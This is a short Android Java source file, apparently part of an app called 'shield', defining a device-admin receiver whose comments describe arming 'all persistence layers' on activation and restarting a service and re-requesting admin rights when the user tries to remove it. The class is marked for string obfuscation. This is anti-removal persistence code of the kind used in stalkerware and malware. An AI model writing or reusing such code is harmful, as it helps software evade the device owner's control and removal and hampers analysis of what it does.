package com.alpha.shield;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

import org.lsposed.lsparanoid.Obfuscate;

@Obfuscate
public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Device admin activated — arm all persistence layers
        new SurvivalManager(context).armAll();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // User tried to remove admin — restart service and try to re-request
        new SurvivalManager(context).armAlarmClock();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Message shown when user tries to deactivate admin
        return context.getString(R.string.admin_disable_warning);
    }
}
